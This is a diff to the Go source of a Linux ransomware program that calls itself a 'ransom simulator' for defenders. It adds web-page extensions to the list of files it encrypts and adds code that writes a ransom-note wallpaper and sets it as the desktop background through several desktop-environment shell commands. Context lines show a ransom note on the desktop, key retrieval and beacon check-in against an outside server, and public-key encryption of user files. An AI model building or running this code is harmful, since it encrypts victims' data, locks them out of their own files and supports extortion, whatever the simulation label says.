@@ -1,4 +1,4 @@
-// ransom_simulator_linux.go - Linux专用版本（增强版）带日志功能 - API优先获取密钥，失败回退本地密钥
+// ransom_simulator_linux.go
 package main
 
 import (
@@ -31,7 +31,7 @@ import (
 )
 
 const (
-	version   = "v3.4-Linux"
+	version   = "v3.6"
 	apiURL    = "https://encrypt.yangzifun.org/E56dSY"
 	beaconURL = "https://encrypt.yangzifun.org/beacon_check_in"
 
@@ -116,7 +116,7 @@ Do not attempt to decrypt it yourself or use third-party software; this will cau
 https://encrypt.yangzifun.org/
 获取私钥ID是: %s
 
-项目链接：https://github.com/yangzifun/ransom_simulator
+项目仓库链接：https://git.yangzifun.org/YZFN/ransom_simulator
 免责声明与许可
 本项目遵循 MIT 许可证请查阅 LICENSE 文件了解详情。
 再次强调，此工具的创建旨在赋能**防御者**，而非赋能攻击者。请在法律和道德允许的范围内负责任地使用。
@@ -124,8 +124,9 @@ https://encrypt.yangzifun.org/
 `
 
 var (
-	lockFilePath       string
-	ransomNoteFileName = "!!!_如何解密你的文件_!!!.txt"
+	lockFilePath            string
+	ransomNoteFileName      = "!!!_如何解密你的文件_!!!.txt"
+	ransomWallpaperFileName = "ransom_wallpaper.png"
 
 	// 阶段2行为控制变量
 	stealthMode     bool
@@ -205,6 +206,8 @@ var (
 		// 文档文件
 		".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx",
 		".odt", ".csv", ".txt", ".rtf", ".md", ".tex", ".epub",
+		// 网页文件
+		".html", ".htm", ".xhtml", ".mht", ".mhtml",
 		// 压缩文件
 		".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz", ".tgz",
 		// 图片文件
@@ -291,7 +294,7 @@ func main() {
 	forceReleaseLock()
 
 	fmt.Println("==================================================")
-	fmt.Println("      勒索软件模拟器 - Linux增强版（API优先+本地回退）")
+	fmt.Println("      勒索软件模拟器 - Linux增强版      ")
 	fmt.Printf("                版本: %s\n", version)
 	fmt.Println("==================================================")
 
@@ -443,12 +446,12 @@ func main() {
 
 	if !*dryRunFlag {
 		fmt.Println("\n[阶段 4: 勒索信增强]")
-		noteContent := fmt.Sprintf(ransomNoteContent, finalUUID, finalUUID, finalUUID)
+		noteContent := fmt.Sprintf(ransomNoteContent, finalUUID)
 		desktopPath := getLinuxDesktopPath()
 		if desktopPath != "" {
 			_ = os.WriteFile(filepath.Join(desktopPath, ransomNoteFileName), []byte(noteContent), 0644)
 		}
-		createRansomWallpaper()
+		createRansomWallpaper(finalUUID)
 	}
 
 	fmt.Println("\n================== [ 任务完成 ] ==================")
@@ -1249,24 +1252,76 @@ func getLinuxDesktopPath() string {
 	return home
 }
 
-func createRansomWallpaper() {
-	fmt.Println("[*] Linux壁纸修改功能(模拟)")
+// createRansomWallpaper 生成勒索提示壁纸并设置为当前用户桌面背景
+func createRansomWallpaper(uuid string) {
+	fmt.Println("[*] 生成并设置勒索提示壁纸...")
 
 	if logEnabled {
-		logOperation("尝试修改壁纸")
+		logOperation("开始生成勒索提示壁纸")
 	}
 
-	// 尝试修改壁纸（需要桌面环境）
-	wallpaperCommands := []string{
-		"gsettings set org.gnome.desktop.background picture-uri 'file:///tmp/ransom_wallpaper.png'",
-		"xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/workspace0/last-image -s /tmp/ransom_wallpaper.png",
-		"pcmanfm --set-wallpaper /tmp/ransom_wallpaper.png",
+	// 优先输出到程序所在目录，不可用时回退到用户主目录
+	outPath := filepath.Join(programDir, ransomWallpaperFileName)
+	if _, err := os.Stat(programDir); err != nil {
+		if home, herr := os.UserHomeDir(); herr == nil {
+			outPath = filepath.Join(home, ransomWallpaperFileName)
+		}
 	}
 
-	for _, cmdStr := range wallpaperCommands {
-		cmd := exec.Command("sh", "-c", cmdStr)
-		_ = cmd.Run()
+	if err := generateRansomWallpaper(outPath, uuid); err != nil {
+		fmt.Printf("[!] 生成壁纸失败: %v\n", err)
+		if logEnabled {
+			logOperation(fmt.Sprintf("生成壁纸失败: %v", err))
+		}
+		clearWallpaperFallback()
+		return
 	}
+	fmt.Printf("[+] 壁纸已生成: %s\n", outPath)
+
+	setWallpaperFromPath(outPath)
+
+	fmt.Printf("[+] 壁纸已设置为: %s\n", outPath)
+	if logEnabled {
+		logOperation("壁纸设置完成: " + outPath)
+	}
+}
+
+// setWallpaperFromPath 通过各主流桌面环境命令设置壁纸（GNOME/XFCE/LXDE/feh/nitrogen/macOS）
+func setWallpaperFromPath(path string) {
+	q := shellQuote(path)
+	uri := shellQuote("file://" + path)
+	cmds := []string{
+		"gsettings set org.gnome.desktop.background picture-uri " + uri,
+		"gsettings set org.gnome.desktop.background picture-uri-dark " + uri,
+		"gsettings set org.gnome.desktop.background picture-options 'zoom'",
+		"xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/workspace0/last-image -s " + q,
+		"pcmanfm --set-wallpaper " + q,
+		"feh --bg-fill " + q,
+		"nitrogen --set-zoom-fill --save " + q,
+		"osascript -e " + shellQuote(`tell application "System Events" to set picture of every desktop to "`+path+`"`),
+	}
+	for _, c := range cmds {
+		_ = exec.Command("sh", "-c", c).Run()
+	}
+}
+
+// clearWallpaperFallback 生成失败时退化为清除壁纸（保持原有行为）
+func clearWallpaperFallback() {
+	cmds := []string{
+		"gsettings set org.gnome.desktop.background picture-uri ''",
+		"gsettings set org.gnome.desktop.background picture-uri-dark ''",
+		"gsettings set org.gnome.desktop.background primary-color '#000000'",
+		"xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/workspace0/last-image -s ''",
+		"pcmanfm --set-wallpaper ''",
+	}
+	for _, c := range cmds {
+		_ = exec.Command("sh", "-c", c).Run()
+	}
+}
+
+// shellQuote 用单引号包裹路径并转义，供 sh -c 安全使用
+func shellQuote(s string) string {
+	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
 }
 
 func scanFiles(extFilter map[string]bool, scanRoots []string, encryptAllFormats bool) []string {
@@ -1307,7 +1362,7 @@ func scanFiles(extFilter map[string]bool, scanRoots []string, encryptAllFormats 
 			if encryptAllFormats {
 				shouldProcess = true
 				fileName := filepath.Base(path)
-				if fileName == ransomNoteFileName || strings.HasSuffix(fileName, ".lock") || strings.EqualFold(filepath.Ext(fileName), ".encrypted") {
+				if fileName == ransomNoteFileName || fileName == ransomWallpaperFileName || strings.HasSuffix(fileName, ".lock") || strings.EqualFold(filepath.Ext(fileName), ".encrypted") {
 					shouldProcess = false
 				}
 			} else {
@@ -1367,11 +1422,10 @@ func runEncryptionWithMonitor(files []string, numWorkers int, stats *counters, o
 		fmt.Printf("失败: %v\n", parseErr)
 		fmt.Println("[!] 公钥格式错误，程序终止")
 		os.Exit(1)
-	} else {
-		fmt.Println("成功")
-		publicKeyCache = pubKey
-		publicKeyCacheStr = publicKeyPEM
 	}
+	fmt.Println("成功")
+	publicKeyCache = pubKey
+	publicKeyCacheStr = publicKeyPEM
 
 	*outUUID = uuid
 
@@ -1572,14 +1626,13 @@ func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUU
 		fmt.Printf("失败: %v\n", parseErr)
 		fmt.Println("[!] 公钥格式错误，程序终止")
 		os.Exit(1)
-	} else {
-		fmt.Println("成功")
-		// 存储解析后的公钥到缓存
-		publicKeyCache = pubKey
-		publicKeyCacheStr = publicKeyPEM
 	}
+	fmt.Println("成功")
+	// 存储解析后的公钥到缓存
+	publicKeyCache = pubKey
+	publicKeyCacheStr = publicKeyPEM
 
-	finalAccurateNote := fmt.Sprintf(ransomNoteContent, uuid, uuid, uuid)
+	finalAccurateNote := fmt.Sprintf(ransomNoteContent, uuid)
 	var visitedDirs sync.Map
 
 	log, err3 := newFileLog("ransom_log.txt")
@@ -1735,7 +1788,11 @@ func isExcluded(path string) bool {
 }
 
 func shouldEncrypt(filePath string, extFilter map[string]bool) bool {
+	fileName := filepath.Base(filePath)
 	ext := strings.ToLower(filepath.Ext(filePath))
+	if fileName == ransomNoteFileName || fileName == ransomWallpaperFileName || strings.HasSuffix(fileName, ".lock") || strings.EqualFold(ext, ".encrypted") {
+		return false
+	}
 	return extFilter[ext]
 }
 
